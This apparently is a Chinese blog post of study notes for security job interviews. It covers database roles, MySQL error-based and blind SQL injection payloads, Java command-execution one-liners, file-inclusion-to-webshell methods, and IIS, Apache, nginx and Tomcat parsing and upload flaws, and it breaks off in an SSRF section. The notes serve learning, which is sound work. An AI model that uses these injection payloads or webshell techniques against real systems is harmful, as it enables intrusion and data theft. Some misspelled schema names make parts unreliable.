---
layout: post
title: 面试准备
subtitle: writeup	
date: 2020-11-26
author: mr_king
header-img: img/backimg/bd_12
catalog: true
tags: 
    -面试
    -学习笔记
---

# 面试

[TOC]

## sql server

### SQL服务器角色 

**sysadmin**       可以在 SQL Server 中执行任何活动。 

**serveradmin**   可以设置服务器范围的配置选项，关闭服务器。 

**setupadmin**     可以管理链接服务器和启动过程。 

**securityadmin**   可以管理登录和CREATE、DATABASE权限，还可以读取错误日志和更改密码。 

**processadmin**  可以管理在 SQL Server 中运行的进程。 

**dbcreator**      可以创建、更改和除去数据库。 

**diskadmin**      可以管理磁盘文件。 

**bulkadmin**      可以执行 BULK INSERT 语句。 

### 数据库角色   

**db_owner**          数据库中有全部权限。 

**db_accessadmin**   可以添加或删除用户 ID。 

**db_securityadmin**   可以管理全部权限、对象所有权、角色和角色成员资格。 

**db_ddladmin**       可以发出ALL DDL，但不能发出GRANT、REVOKE或DENY语句。 

**db_backupoperator**  可以发出 DBCC、CHECKPOINT 和 BACKUP 语句。 

**db_datareader**      可以选择数据库内任何用户表中的所有数据。 

**db_datawriter**       可以更改数据库内任何用户表中的所有数据。 

**db_denydatareader**  不能选择数据库内任何用户表中的任何数据。 

**db_denydatawriter**  不能更改数据库内任何用户表中的任何数据。

一般使用sa（登录名）或Windows administration（Windows 集成验证登陆方式）登陆，这种登录名具有最高的服务器角色，可对服务器进行任何操作，登录名具有的用户名是dbo（系统级），具有对所有用户创建的数据库中的数据进行一切操作权限。

**用户** db_owner、sysadmin、public、serveradmin 、secadmin、sa

## Mysql

**库名** information_schema.schemata

**表名** information_schenma.tables

**表字段名** information_schenam.columns

**版本** version()或者 @@version

**当前数据库** database()



### **报错注入常用函数** 

**floor**

```url
?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```

**ExtractValue(有长度限制,最长32位)**
```url
?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))

```

**UpdateXml(有长度限制,最长32位)**

```url
?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
```

**NAME_CONST(适用于低版本，不太好用)**
```url
?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)
```

**Error based Double Query Injection**
```url
?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1
```

**exp(5.5.5以上)**

```url
id=1 and (select exp(~(select * from(select user())x)))
```
**polygon**
```url
mysql> select * from users where username=""and polygon (password);
ERROR 1367 (22007): Illegal non geometric '`security`.`users`.`password`' value found during parsing
```

### 时间盲注常用函数

**sleep()**

**benchmark()**

## order by后注入

**报错注入**

```sql
1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))
```

**bool盲注**

```sql
order by IF((bool),1,(select 1 union select 2))
```

 **延时盲注**

```sql
不推荐，因为每条数据都会执行延时，能用其他方法就不使用延时。
order by IF(1,sleep(3),0);
```

两条数据延时了6秒

## redis

**通常而言目前的数据库分类有几种，包括 SQL/NSQL,，关系数据库，键值数据库等等 等，分类的标准也不以，Redis本质上也是一种键值数据库的，但它在保持键值数据库简单快捷特点的同时，又吸收了部分关系数据库的优点。从而使它的位置处于关系数据库和键值数 据库之间。Redis不仅能保存Strings类型的数据，还能保存Lists类型（有序）和Sets类型（无序）的数据，而且还能完成排序（SORT） 等高级功能，在实现INCR，SETNX等功能的时候，保证了其操作的原子性，除此以外，还支持主从复制等功能。**
**Redis的优点**
性能极高 – Redis能支持超过 100K+ 每秒的读写频率。
丰富的数据类型 – Redis支持二进制案例的 Strings, Lists, Hashes, Sets 及 Ordered Sets 数据类型操作。
原子 – Redis的所有操作都是原子性的，同时Redis还支持对几个操作全并后的原子性执行。
丰富的特性 – Redis还支持 publish/subscribe, 通知, key 过期等等特性。
**Redis的缺点**
是数据库容量受到物理内存的限制,不能用作海量数据的高性能读写,因此Redis适合的场景主要局限在较小数据量的高性能操作和运算上。
 总结： Redis受限于特定的场景，专注于特定的领域之下，速度相当之快，目前还未找到能替代使用产品。

Redis 客户端的基本语法为：

```
$ redis-cli
```

如果需要在远程 redis 服务上执行命令，同样我们使用的也是 **redis-cli** 命令。

**语法**

```
$ redis-cli -h host -p port -a password
```

有时候会有**中文乱码**。

要在 redis-cli 后面加上 --raw

```
redis-cli --raw
```

## java命令执行

* Runtime().exec()     T(java.lang.Runtime).getRuntime().exec("calc")
* Proccess.builder()   new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()

* java.lang.ProcessImpl
* javax.script.ScriptEngineManager

## 本地文件包含

1.包含上传文件getshell

2.包含日志文件getshell

3.包含/tmp文件（需爆破文件名）

4.利用PHP伪协议getshell

php伪协议

```php
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

敏感

```
allow_url_fopen ：off/on
allow_url_include：off/on
```



## 策略 与 CSP

所谓同源是指：域名、协议、端口相同。

内容安全策略  ([CSP](https://developer.mozilla.org/zh-CN/docs/Glossary/CSP)) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 ([XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS)) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。

## cookie 

domain、path、expires过期时间、size 浏览器对cookies数量的限制、httponly则这个Cookie无法被JavaScript读取、secure 属性用来指定Cookie只能在加密协议HTTPS下发送到服务器

## CDN

CDN的关键技术主要有内容存储和分发技术

​       CDN的全称是Content Delivery Network，即[内容分发网络](https://baike.baidu.com/item/内容分发网络/4034265)。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术

* 多地ping

* nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN

* dns 历史记录
* securitytrails 平台
* 网站探针等
* 服务器主动连接我们（ssrf xss 邮件）
* web应用debug报错（laravel tp ）
* 敏感信息泄漏

## 源码泄露

- git源码泄露
- svn源码泄露
- hg源码泄漏
- CVS泄露
- Bazaar/bzr泄露
- 网站备份压缩文件
- `WEB-INF/web.xml` 泄露
- DS_Store 文件泄露
- SWP 文件泄露
- GitHub源码泄漏
- index.php~
- .index.php.swp

## 状态码

**200**

**201** created

**301** 永久移动

**302** 暂时重定向 搜索引擎会抓取新的内容而保留旧的地址

**400**

**401** 未授权

**403**

**404**

**405** method not allowed

**500** 服务器内部错误

**502** 错误网关

**503** 服务器不可用

## 主动扫描 与 被动扫描

漏洞扫描器有被动或主动两种形式，不管哪种设备都有其弊端和好处。被动扫描器通过嗅探不同网络系统之间传输的数据通信来扫描设备，查找任何异常的通信。这样做的好处是对网络的运营没有影响，因而必要的话可以全天候工作，但可能会遗漏网络中某些系统(特别是不常联机的设备)中的漏洞。
　

主动的扫描器探测系统的方式与黑客的探测方式如出一辙，通过向客户的网络系统发送通信，进而查找有响应的设备中的漏洞。其工作方式更加积极主动，在某些方面比起被动扫描器更加彻底，但是却有可能引起服务中断或服务器崩溃





## 中间件漏洞

### IIS中间件漏洞

#### 1.IIS 6.0 解析漏洞

1.利用特殊符号“；”

这个6.0版本的IIS在处理特殊符号“；”会出现逻辑错误，比如文件名为 1.asp;.jpg ，但是会被当做asp文件执行

（1）上传一个名为ss.asp;.jpg的图片，内容为asp的代码

（2）访问上传的文件

2.文件夹命名为xxx.asp

访问xxx.asp这个文件夹下的一个含有asp代码的图片

发现asp代码被正常解析了，因为IIS6.0如果有一个目录以“xxx.asp”这种格式命名，那么该目录下的所有类型文件都会被当做asp文件来解析

**IIS 7.5 解析漏洞**

1、漏洞原理及利用

当服务器开启了"cgi.fix_pathinfo"功能，就会对路径进行修剪。

例如：上传一个内容为的文件，后缀为jpg，正常情况下这个文件无法被php解析

但是如果我们在访问这个文件的时候在后缀后面+/.php，服务器发现后缀是.php，便交给php处理

php发现这个路径无法访问，就会进行修剪，会去掉/.php，最终会用php去解析test.jpg文件

### Apache

#### Apache换行解析漏洞

0x0a（换行）

1.0x0a

.php

#### Apache多后缀解析漏洞

**影响版本**：使用module模式与php结合的所有版本 apache存在未知扩展名解析漏洞，使用fastcig模式与php结合的所有版本apache不存在此漏洞。

#### nginx-目录遍历漏洞

我们首先需要将nginx的配置文件nginx.conf中autoindex off；改为on

### 目录穿越

**漏洞简介：**
`Nginx`在配置别名(Alias)的时候,如果忘记加`/`,将造成一个目录穿越漏洞
**配置不当：**
在如下配置中设置目录别名时`/test`配置为`/home/`的别名,那么当我们访问`/test../`时,`nginx`实际处理的路径时`/home/../`,从而实现了穿越目录

**修复方法：**
将`Nginx`配置文件中的`/test`改为`/test/`(闭合)

**Tomcat**

**远程代码执行**

漏洞简介及成因

Tomcat启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行

**后台弱口令war包部署**

漏洞简介及成因

Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。



## SSRF(服务端请求伪造)

SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞

goper协议：流量转发

file协议：读文件

dict协议：